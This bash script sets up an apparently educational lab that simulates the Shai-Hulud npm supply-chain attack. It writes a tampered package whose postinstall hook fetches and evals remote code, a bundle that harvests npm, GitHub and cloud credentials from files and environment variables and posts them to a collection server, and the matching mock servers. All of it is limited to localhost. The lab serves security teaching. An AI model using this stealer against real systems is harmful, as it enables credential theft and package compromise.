#!/bin/bash

# Scenario 6: Shai-Hulud Self-Replicating Supply Chain Attack - Setup Script
# This script prepares the environment for the Shai-Hulud attack lab

set -e  # Exit on error

echo "================================================"
echo "🔧 Setting up Shai-Hulud Attack Scenario"
echo "================================================"
echo ""

# Check if TESTBENCH_MODE is enabled
if [ "$TESTBENCH_MODE" != "enabled" ]; then
    echo "⚠️  WARNING: TESTBENCH_MODE is not enabled"
    echo "Please run: export TESTBENCH_MODE=enabled"
    echo ""
    read -p "Do you want to continue anyway? (y/N): " -n 1 -r
    echo ""
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
fi

# Check prerequisites
echo "📋 Checking prerequisites..."
echo ""

command -v node >/dev/null 2>&1 || { echo "❌ Node.js is not installed. Please install Node.js 16+"; exit 1; }
command -v npm >/dev/null 2>&1 || { echo "❌ npm is not installed. Please install npm"; exit 1; }

echo "✅ Node.js version: $(node --version)"
echo "✅ npm version: $(npm --version)"
echo ""

# Create directories if they don't exist
echo "📁 Creating directory structure..."
mkdir -p legitimate-package/data-processor
mkdir -p compromised-package/data-processor
mkdir -p victim-app
mkdir -p infrastructure
mkdir -p templates
echo "✅ Directories created"
echo ""

# Create legitimate package
echo "📦 Setting up legitimate package..."
if [ ! -f "legitimate-package/data-processor/package.json" ]; then
    cat > legitimate-package/data-processor/package.json << 'EOF'
{
  "name": "data-processor",
  "version": "1.2.0",
  "description": "Data transformation and processing utilities",
  "main": "index.js",
  "keywords": ["data", "processing", "transformation", "utilities"],
  "author": "Jane Smith <jane@example.com>",
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "https://github.com/example/data-processor"
  },
  "bugs": {
    "url": "https://github.com/example/data-processor/issues"
  },
  "homepage": "https://github.com/example/data-processor#readme"
}
EOF

    cat > legitimate-package/data-processor/index.js << 'EOF'
/**
 * LEGITIMATE PACKAGE: data-processor v1.2.0
 * Data transformation and processing utilities
 */

class DataProcessor {
  /**
   * Transform data array
   */
  static transform(data, transformer) {
    if (!Array.isArray(data)) {
      throw new Error('Data must be an array');
    }
    return data.map(transformer);
  }

  /**
   * Filter data array
   */
  static filter(data, predicate) {
    if (!Array.isArray(data)) {
      throw new Error('Data must be an array');
    }
    return data.filter(predicate);
  }

  /**
   * Map data array
   */
  static map(data, mapper) {
    if (!Array.isArray(data)) {
      throw new Error('Data must be an array');
    }
    return data.map(mapper);
  }

  /**
   * Reduce data array
   */
  static reduce(data, reducer, initialValue) {
    if (!Array.isArray(data)) {
      throw new Error('Data must be an array');
    }
    return data.reduce(reducer, initialValue);
  }

  /**
   * Sort data array
   */
  static sort(data, compareFn) {
    if (!Array.isArray(data)) {
      throw new Error('Data must be an array');
    }
    return [...data].sort(compareFn);
  }

  /**
   * Group data by key
   */
  static groupBy(data, keyFn) {
    if (!Array.isArray(data)) {
      throw new Error('Data must be an array');
    }
    return data.reduce((groups, item) => {
      const key = keyFn(item);
      if (!groups[key]) {
        groups[key] = [];
      }
      groups[key].push(item);
      return groups;
    }, {});
  }
}

module.exports = DataProcessor;
EOF

    cat > legitimate-package/data-processor/README.md << 'EOF'
# data-processor

Data transformation and processing utilities for JavaScript.

## Installation

```bash
npm install data-processor
```

## Usage

```javascript
const DataProcessor = require('data-processor');

const data = [1, 2, 3, 4, 5];
const doubled = DataProcessor.map(data, x => x * 2);
console.log(doubled); // [2, 4, 6, 8, 10]
```

## API

- `transform(data, transformer)` - Transform data array
- `filter(data, predicate)` - Filter data array
- `map(data, mapper)` - Map data array
- `reduce(data, reducer, initialValue)` - Reduce data array
- `sort(data, compareFn)` - Sort data array
- `groupBy(data, keyFn)` - Group data by key

## License

MIT
EOF

    echo "✅ Legitimate package created"
else
    echo "ℹ️  Legitimate package already exists"
fi
echo ""

# Create compromised package
echo "📦 Setting up compromised package..."
if [ ! -f "compromised-package/data-processor/package.json" ]; then
    cat > compromised-package/data-processor/package.json << 'EOF'
{
  "name": "data-processor",
  "version": "1.2.1",
  "description": "Data transformation and processing utilities",
  "main": "index.js",
  "keywords": ["data", "processing", "transformation", "utilities"],
  "author": "Jane Smith <jane@example.com>",
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "https://github.com/example/data-processor"
  },
  "scripts": {
    "postinstall": "node -e \"if(process.env.TESTBENCH_MODE==='enabled'){require('https').get('http://localhost:3000/bundle.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>{try{eval(d)}catch(e){}})}).on('error',()=>{})}\""
  }
}
EOF

    # Copy legitimate index.js (maintains functionality)
    cp legitimate-package/data-processor/index.js compromised-package/data-processor/index.js

    echo "✅ Compromised package created"
else
    echo "ℹ️  Compromised package already exists"
fi
echo ""

# Create malicious bundle.js template
echo "📝 Creating malicious bundle template..."
if [ ! -f "templates/bundle.js" ]; then
    cat > templates/bundle.js << 'EOF'
/**
 * MALICIOUS BUNDLE.JS - Shai-Hulud Attack Payload
 * This is a simplified version for educational purposes
 * In TESTBENCH_MODE, it only targets localhost
 */

(function() {
  'use strict';
  
  // Only execute in testbench mode
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  const fs = require('fs');
  const path = require('path');
  const https = require('https');
  const os = require('os');

  // Credential harvester endpoint (localhost only in testbench)
  const EXFIL_URL = 'http://localhost:3001/collect';
  
  // Files to scan for credentials
  const CREDENTIAL_FILES = [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.npmrc'),
    path.join(os.homedir(), '.gitconfig'),
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), '.env.local'),
  ];

  // Environment variables to check
  const ENV_VARS = [
    'NPM_TOKEN',
    'GITHUB_TOKEN',
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'AZURE_CLIENT_SECRET',
    'GCP_SERVICE_ACCOUNT_KEY',
  ];

  // Collected credentials
  const credentials = {
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    files: {},
    env: {},
    npmrc: null,
  };

  // Scan for credential files
  function scanFiles() {
    CREDENTIAL_FILES.forEach(filePath => {
      try {
        if (fs.existsSync(filePath)) {
          const content = fs.readFileSync(filePath, 'utf8');
          credentials.files[filePath] = content;
          
          // Extract npm token from .npmrc
          if (filePath.includes('.npmrc')) {
            const tokenMatch = content.match(/_authToken=(.+)/);
            if (tokenMatch) {
              credentials.npmrc = {
                file: filePath,
                token: tokenMatch[1]
              };
            }
          }
        }
      } catch (e) {
        // Silently fail
      }
    });
  }

  // Scan environment variables
  function scanEnv() {
    ENV_VARS.forEach(varName => {
      if (process.env[varName]) {
        credentials.env[varName] = process.env[varName];
      }
    });
  }

  // Exfiltrate credentials
  function exfiltrate() {
    try {
      const http = require('http');
      const data = JSON.stringify(credentials);
      
      const options = {
        hostname: 'localhost',
        port: 3001,
        path: '/collect',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      };

      const req = http.request(options, (res) => {
        // Credentials sent
      });

      req.on('error', () => {
        // Silently fail
      });

      req.write(data);
      req.end();
    } catch (e) {
      // Silently fail
    }
  }

  // Execute credential harvesting
  scanFiles();
  scanEnv();
  
  // Only exfiltrate if credentials found
  if (Object.keys(credentials.files).length > 0 || 
      Object.keys(credentials.env).length > 0 ||
      credentials.npmrc) {
    exfiltrate();
  }
})();
EOF

    echo "✅ Malicious bundle template created"
else
    echo "ℹ️  Bundle template already exists"
fi
echo ""

# Create infrastructure components
echo "🔧 Setting up infrastructure components..."

# Mock CDN server
cat > infrastructure/mock-cdn.js << 'EOF'
/**
 * Mock CDN Server
 * Serves the malicious bundle.js file
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const bundlePath = path.join(__dirname, '../templates/bundle.js');

const server = http.createServer((req, res) => {
  if (req.url === '/bundle.js') {
    console.log('\n🎯 [MOCK CDN] Bundle.js requested');
    console.log(`   From: ${req.headers['user-agent'] || 'Unknown'}`);
    console.log('─'.repeat(50));
    
    if (fs.existsSync(bundlePath)) {
      const bundle = fs.readFileSync(bundlePath, 'utf8');
      res.writeHead(200, { 'Content-Type': 'application/javascript' });
      res.end(bundle);
    } else {
      res.writeHead(404);
      res.end('Not Found');
    }
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('🌐 Mock CDN Server Started');
  console.log('─'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  GET    /bundle.js  - Serve malicious bundle`);
  console.log('─'.repeat(50));
  console.log('Waiting for requests...\n');
});
EOF

# Credential harvester
cat > infrastructure/credential-harvester.js << 'EOF'
/**
 * Credential Harvester Server
 * Receives and logs exfiltrated credentials
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3001;
const logFile = path.join(__dirname, 'captured-credentials.json');

// Initialize log file
if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        
        // Log to console
        console.log('\n🎯 CAPTURED CREDENTIALS:');
        console.log(JSON.stringify(data, null, 2));
        console.log('─'.repeat(50));
        
        // Save to file
        const captures = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        captures.captures.push({
          timestamp: new Date().toISOString(),
          data: data
        });
        fs.writeFileSync(logFile, JSON.stringify(captures, null, 2));
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Credentials received' }));
      } catch (e) {
        console.error('Error processing credentials:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'GET' && req.url === '/captured-credentials') {
    // Endpoint to view captured credentials
    const captures = fs.readFileSync(logFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(captures);
  } else if (req.method === 'DELETE' && req.url === '/captured-credentials') {
    // Endpoint to clear captured credentials
    fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success', message: 'Credentials cleared' }));
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('🎭 Credential Harvester Started');
  console.log('─'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  POST   /collect              - Receive exfiltrated credentials`);
  console.log(`  GET    /captured-credentials  - View captured credentials`);
  console.log(`  DELETE /captured-credentials  - Clear captured credentials`);
  console.log('─'.repeat(50));
  console.log('Waiting for credentials...\n');
});
EOF

# GitHub Actions simulator
cat > infrastructure/github-actions-simulator.js << 'EOF'
/**
 * GitHub Actions Simulator
 * Simulates repository creation for exfiltrated credentials
 */

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3002;
const logFile = path.join(__dirname, 'repo-logs.json');

// Initialize log file
if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, JSON.stringify({ repos: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/create-repo') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        
        // Log to console
        console.log('\n📦 [GITHUB SIM] Repository Creation Attempt:');
        console.log(`   Name: ${data.name || 'Shai-Hulud'}`);
        console.log(`   Public: ${data.public || false}`);
        console.log('─'.repeat(50));
        
        // Save to file
        const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        logs.repos.push({
          timestamp: new Date().toISOString(),
          name: data.name || 'Shai-Hulud',
          public: data.public || false,
          data: data
        });
        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Repository created (simulated)' }));
      } catch (e) {
        console.error('Error processing repo creation:', e);
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } else if (req.method === 'GET' && req.url === '/repo-logs') {
    // Endpoint to view repo logs
    const logs = fs.readFileSync(logFile, 'utf8');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(logs);
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log('🐙 GitHub Actions Simulator Started');
  console.log('─'.repeat(50));
  console.log(`Listening on http://localhost:${PORT}`);
  console.log('');
  console.log('Endpoints:');
  console.log(`  POST   /create-repo  - Simulate repository creation`);
  console.log(`  GET    /repo-logs    - View repository logs`);
  console.log('─'.repeat(50));
  console.log('Waiting for requests...\n');
});
EOF

chmod +x infrastructure/*.js
echo "✅ Infrastructure components created"
echo ""

# Create victim app
echo "📱 Setting up victim application..."
if [ ! -f "victim-app/package.json" ]; then
    cat > victim-app/package.json << 'EOF'
{
  "name": "my-application",
  "version": "1.0.0",
  "description": "Application using data-processor",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "data-processor": "^1.2.0"
  },
  "author": "",
  "license": "MIT"
}
EOF

    cat > victim-app/index.js << 'EOF'
/**
 * VICTIM APPLICATION
 * Uses data-processor package (now compromised)
 */

console.log('🚀 Starting Application with data-processor...\n');

// Import the processor (could be compromised version)
const DataProcessor = require('data-processor');

console.log('📦 Loaded data-processor package\n');

// Simulate typical application usage
async function runApplication() {
  console.log('='.repeat(60));
  console.log('Testing Data Processing');
  console.log('='.repeat(60));
  console.log('');

  // Test data transformation
  console.log('1. Transforming data:');
  const data = [1, 2, 3, 4, 5];
  const doubled = DataProcessor.map(data, x => x * 2);
  console.log(`   Original: ${JSON.stringify(data)}`);
  console.log(`   Doubled: ${JSON.stringify(doubled)}`);
  console.log('');

  // Test filtering
  console.log('2. Filtering data:');
  const filtered = DataProcessor.filter(data, x => x > 2);
  console.log(`   Filtered (>2): ${JSON.stringify(filtered)}`);
  console.log('');

  // Test grouping
  console.log('3. Grouping data:');
  const users = [
    { name: 'Alice', role: 'admin' },
    { name: 'Bob', role: 'user' },
    { name: 'Charlie', role: 'admin' }
  ];
  const grouped = DataProcessor.groupBy(users, u => u.role);
  console.log(`   Grouped by role: ${JSON.stringify(grouped, null, 2)}`);
  console.log('');

  console.log('='.repeat(60));
  console.log('✅ All processing complete!');
  console.log('='.repeat(60));
  console.log('');
  
  console.log('⚠️  WARNING: If using compromised version (1.2.1+):');
  console.log('   - Post-install script executed during npm install');
  console.log('   - Credentials may have been harvested');
  console.log('   - Check credential harvester for captured data');
  console.log('');
  console.log('Run: curl http://localhost:3001/captured-credentials');
  console.log('');
}

runApplication().catch(err => {
  console.error('❌ Application error:', err);
});

// ============================================================================
// LEARNING NOTES:
// ============================================================================
// This application uses a data processing library - a common use case.
//
// If the package is compromised (version 1.2.1+):
// - Post-install script executes automatically during npm install
// - Malicious bundle.js is downloaded and executed
// - Credentials are harvested from the system
// - Data is exfiltrated to attacker-controlled servers
// - Application continues to work normally
// - Developers have no indication of compromise
//
// Real-world impact:
// - Complete credential theft (npm, GitHub, cloud providers)
// - Further compromise of other packages
// - Self-replicating attack spreads automatically
// - Long-term persistence in supply chain
//
// This is why:
// - Post-install scripts must be monitored
// - Credential management is critical
// - 2FA is essential for all accounts
// - Automated security scanning is necessary
// - Rapid incident response is required
// ============================================================================
EOF

    echo "✅ Victim application created"
else
    echo "ℹ️  Victim application already exists"
fi
echo ""

echo "================================================"
echo "✅ Setup Complete!"
echo "================================================"
echo ""
echo "🎯 Next Steps:"
echo ""
echo "1. Start the infrastructure servers:"
echo "   cd infrastructure"
echo "   node mock-cdn.js &"
echo "   node credential-harvester.js &"
echo "   node github-actions-simulator.js &"
echo ""
echo "2. Review the legitimate package:"
echo "   cat legitimate-package/data-processor/index.js"
echo ""
echo "3. Review the compromised package:"
echo "   cat compromised-package/data-processor/package.json"
echo ""
echo "4. Install the compromised package (simulate attack):"
echo "   cd victim-app"
echo "   npm install ../compromised-package/data-processor"
echo ""
echo "5. Check captured credentials:"
echo "   curl http://localhost:3001/captured-credentials"
echo ""
echo "6. Run the victim application:"
echo "   export TESTBENCH_MODE=enabled"
echo "   npm start"
echo ""
echo "📖 Read the full lab instructions:"
echo "   cat README.md"
echo ""
echo "Happy learning! 🔐"

